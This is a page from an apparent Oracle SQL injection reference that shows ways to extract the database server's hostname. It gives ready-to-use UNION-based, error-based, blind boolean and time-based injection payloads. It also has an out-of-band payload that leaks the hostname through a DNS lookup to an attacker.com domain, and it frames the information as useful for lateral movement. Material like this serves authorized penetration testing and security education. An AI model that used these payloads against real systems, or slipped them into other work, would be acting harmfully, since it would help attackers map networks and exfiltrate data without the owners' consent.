---
title: Server Hostname
description: Techniques to retrieve the Oracle database server hostname information
category: Information Gathering
order: 6
tags: ["hostname", "enumeration", "system information"]
lastUpdated: 2026-10-08
---

Determining the hostname of an Oracle database server can provide valuable information about the network infrastructure and assist in mapping the target environment. This information is often useful for lateral movement in more complex environments.

## Basic Hostname Queries

Oracle provides several system views and functions to obtain hostname information:

| Method                                  | Description                            | Privileges                                       |
| --------------------------------------- | -------------------------------------- | ------------------------------------------------ |
| `SYS_CONTEXT('USERENV', 'SERVER_HOST')` | Current server hostname (10g+)         | None                                             |
| `UTL_INADDR.GET_HOST_NAME`              | Local hostname via UTL_INADDR package  | EXECUTE on `UTL_INADDR` and a network ACL        |
| `v$instance.HOST_NAME`                  | Instance hostname from v$instance view | `SELECT ANY DICTIONARY` or `SELECT_CATALOG_ROLE` |
| `gv$instance.HOST_NAME`                 | One row per instance in a RAC cluster  | `SELECT ANY DICTIONARY` or `SELECT_CATALOG_ROLE` |

## Standard Hostname Queries

```sql
-- Most common method, works for any user
SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST') FROM dual

-- From v$instance view
SELECT HOST_NAME FROM v$instance

-- Full instance information
SELECT INSTANCE_NAME, HOST_NAME, STATUS, DATABASE_STATUS FROM v$instance
```

## SQL Injection Examples

### UNION-Based Hostname Extraction

```sql
-- Two-column string query
' UNION SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST'),NULL FROM dual--

-- Four-column string query
' UNION SELECT NULL,HOST_NAME,NULL,NULL FROM v$instance--
```

### Error-Based Hostname Extraction

These work when the application displays database errors. `OR` makes Oracle evaluate the function even though `username = ''` matches no row:

```sql
-- Oracle Text installed (CTXSYS): the value appears in DRG-11701: thesaurus <value> does not exist
' OR CTXSYS.DRITHSX.SN(1,(SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual))=1--

-- Oracle 23ai+ with ERROR_MESSAGE_DETAILS=ON (the default): ORA-01722 is followed by ORA-03302 ... invalid string value: <value>
' OR 1=TO_NUMBER(SYS_CONTEXT('USERENV','SERVER_HOST'))--
```

### Out-of-Band Extraction

The hostname can also be sent in a DNS lookup, which needs EXECUTE on `UTL_INADDR` and a network ACL (see [Out Of Band Channeling](/oracle/out-of-band-channeling)):

```sql
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(SYS_CONTEXT('USERENV','SERVER_HOST')||'.attacker.com'),NULL FROM dual--
```

### Blind Hostname Extraction

For blind SQL injection, extract the hostname character by character. The injected value must make the original condition true (here `admin`), otherwise the result is always empty:

```sql
-- Check if first character of hostname is 'o'
admin' AND ASCII(SUBSTR(SYS_CONTEXT('USERENV','SERVER_HOST'),1,1))=111--
```

For time-based blind (`DBMS_PIPE` needs an explicit grant, see [Timing](/oracle/timing)):

```sql
-- Add delay if first character is 'o'
admin' AND (CASE WHEN ASCII(SUBSTR(SYS_CONTEXT('USERENV','SERVER_HOST'),1,1))=111 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
```

## Domain Information

In addition to hostname, you can also extract domain information:

```sql
-- Get domain name (the db_domain parameter, often empty)
SELECT SYS_CONTEXT('USERENV', 'DB_DOMAIN') FROM dual

-- Combined hostname and domain
SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST')||'.'||SYS_CONTEXT('USERENV', 'DB_DOMAIN') FROM dual
```

## Network Interface Information

`V$LISTENER_NETWORK` shows the listener addresses, including host and port (needs `SELECT ANY DICTIONARY` or `SELECT_CATALOG_ROLE`):

```sql
-- Returns rows such as LOCAL LISTENER | (ADDRESS=(PROTOCOL=TCP)(HOST=dbhost)(PORT=1521))
SELECT TYPE, VALUE FROM v$listener_network
```

## Environment Details

For more comprehensive environment information:

```sql
-- IP_ADDRESS is the address of the client connected to the database (the application server)
SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST') as hostname,
       SYS_CONTEXT('USERENV', 'DB_NAME') as database_name,
       SYS_CONTEXT('USERENV', 'INSTANCE_NAME') as instance_name,
       SYS_CONTEXT('USERENV', 'IP_ADDRESS') as ip_address
FROM dual
```

## Using UTL_INADDR Package

The UTL_INADDR package resolves names and addresses. Since 11g it needs a network ACL entry with the `resolve` privilege, even for the local host; without one it fails with `ORA-24247`:

```sql
-- Hostname of the database server
SELECT UTL_INADDR.GET_HOST_NAME FROM dual

-- IP address of the database server
SELECT UTL_INADDR.GET_HOST_ADDRESS FROM dual

-- Resolve an internal hostname
SELECT UTL_INADDR.GET_HOST_ADDRESS('internal-hostname') FROM dual
```

## Global Database Name

The global database name combines the database name with the domain:

```sql
-- Get global database name
SELECT GLOBAL_NAME FROM GLOBAL_NAME
```
